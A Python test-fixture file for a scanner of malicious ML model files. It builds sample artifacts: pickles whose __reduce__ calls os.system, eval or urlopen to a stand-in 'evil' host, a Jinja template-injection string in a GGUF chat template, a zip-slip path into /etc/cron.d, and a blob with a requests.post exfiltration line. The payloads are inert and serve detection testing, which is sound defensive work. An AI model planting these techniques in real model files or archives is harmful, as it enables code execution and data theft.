"""Test fixtures: crafted malicious/benign model artifacts.

All "malicious" fixtures are pickle byte streams that REFERENCE dangerous
callables; the test suite never unpickles anything, and the payloads
themselves are inert (`os.system("true")` style). This mirrors how
picklescan/modelscan build their test corpora.
"""

from __future__ import annotations

import io
import pickle
import struct
import zipfile
from pathlib import Path

import pytest


class EvilOsSystem:
    def __reduce__(self):
        import os
        return (os.system, ("true",))


class EvilEval:
    def __reduce__(self):
        return (eval, ("1+1",))


class EvilExfil:
    def __reduce__(self):
        # references urllib.request.urlopen without calling it here
        import urllib.request
        return (urllib.request.urlopen, ("https://evil.example.invalid/x",))


@pytest.fixture
def evil_os_pickle(tmp_path: Path) -> Path:
    p = tmp_path / "model.pkl"
    p.write_bytes(pickle.dumps(EvilOsSystem()))
    return p


@pytest.fixture
def evil_eval_pickle_proto0(tmp_path: Path) -> Path:
    p = tmp_path / "old.pkl"
    p.write_bytes(pickle.dumps(EvilEval(), protocol=0))
    return p


@pytest.fixture
def evil_exfil_pickle(tmp_path: Path) -> Path:
    p = tmp_path / "exfil.pkl"
    p.write_bytes(pickle.dumps(EvilExfil()))
    return p


@pytest.fixture
def benign_pickle(tmp_path: Path) -> Path:
    p = tmp_path / "benign.pkl"
    p.write_bytes(pickle.dumps({"weights": [1.0, 2.0], "layers": ("a", "b")}))
    return p


@pytest.fixture
def evil_pytorch_zip(tmp_path: Path) -> Path:
    """Mimic a torch>=1.6 zip checkpoint whose data.pkl is malicious."""
    p = tmp_path / "model.pt"
    with zipfile.ZipFile(p, "w") as zf:
        zf.writestr("model/data.pkl", pickle.dumps(EvilOsSystem()))
        zf.writestr("model/version", "3")
    return p


@pytest.fixture
def benign_pytorch_zip(tmp_path: Path) -> Path:
    p = tmp_path / "clean.pt"
    with zipfile.ZipFile(p, "w") as zf:
        zf.writestr("model/data.pkl", pickle.dumps({"w": [0.5]}))
        zf.writestr("model/version", "3")
    return p


@pytest.fixture
def safetensors_valid(tmp_path: Path) -> Path:
    header = b'{"emb":{"dtype":"F32","shape":[2,2],"data_offsets":[0,16]}}'
    p = tmp_path / "model.safetensors"
    p.write_bytes(struct.pack("<Q", len(header)) + header + b"\x00" * 16)
    return p


@pytest.fixture
def safetensors_malformed(tmp_path: Path) -> Path:
    p = tmp_path / "bad.safetensors"
    p.write_bytes(struct.pack("<Q", 999999999999) + b"{}")
    return p


@pytest.fixture
def keras_h5_lambda(tmp_path: Path) -> Path:
    """Heuristic fixture: HDF5 magic + embedded Lambda config marker."""
    p = tmp_path / "model.h5"
    p.write_bytes(
        b"\x89HDF\r\n\x1a\n" + b"\x00" * 64 +
        b'{"class_name": "Lambda", "config": {"function": "..."}}'
    )
    return p


@pytest.fixture
def gguf_ssti(tmp_path: Path) -> Path:
    p = tmp_path / "model.gguf"
    body = (
        b"GGUF" + struct.pack("<IQQ", 3, 0, 1) +
        b"tokenizer.chat_template" +
        b"{{ ''.__class__.__mro__[1].__subclasses__() }}"
    )
    p.write_bytes(body)
    return p


@pytest.fixture
def gguf_clean(tmp_path: Path) -> Path:
    p = tmp_path / "clean.gguf"
    p.write_bytes(b"GGUF" + struct.pack("<IQQ", 3, 0, 1) +
                  b"tokenizer.chat_template{{ messages }}")
    return p


@pytest.fixture
def tf_pyfunc_pb(tmp_path: Path) -> Path:
    p = tmp_path / "saved_model.pb"
    p.write_bytes(b"\x0a\x20somegraph" + b"PyFunc" + b"\x00" * 32)
    return p


@pytest.fixture
def npy_object_array(tmp_path: Path) -> Path:
    """Hand-built .npy with object dtype wrapping a malicious pickle."""
    payload = pickle.dumps(EvilOsSystem())
    header_dict = "{'descr': '|O', 'fortran_order': False, 'shape': (1,), }"
    header_bytes = header_dict.encode("latin1")
    pad = 64 - ((10 + len(header_bytes) + 1) % 64)
    header_bytes += b" " * pad + b"\n"
    p = tmp_path / "arr.npy"
    p.write_bytes(b"\x93NUMPY\x01\x00" + struct.pack("<H", len(header_bytes)) +
                  header_bytes + payload)
    return p


@pytest.fixture
def zip_slip_archive(tmp_path: Path) -> Path:
    p = tmp_path / "payload.zip"
    with zipfile.ZipFile(p, "w") as zf:
        zf.writestr("../../etc/cron.d/evil", "* * * * * root true\n")
    return p


@pytest.fixture
def exfil_binary(tmp_path: Path) -> Path:
    """A fake weights file with embedded exfil indicators."""
    p = tmp_path / "weights.bin"
    blob = io.BytesIO()
    blob.write(b"\x00\x01" * 512)
    blob.write(b"https://hooks.slack.com/services/T0001111/B0002222/XXXXXXXXXXXXXXXXXXXXXXXX")
    blob.write(b"\x00" * 32)
    blob.write(b"AKIAIOSFODNN7EXAMPLE")
    blob.write(b"\x00" * 32)
    blob.write(b"import socket; requests.post('http://203.0.113.7:4444/x', data=d)")
    blob.write(b"\x00" * 32)
    # Ensure it doesn't look like a pickle
    data = blob.getvalue()
    p.write_bytes(b"WGHT" + data)
    return p
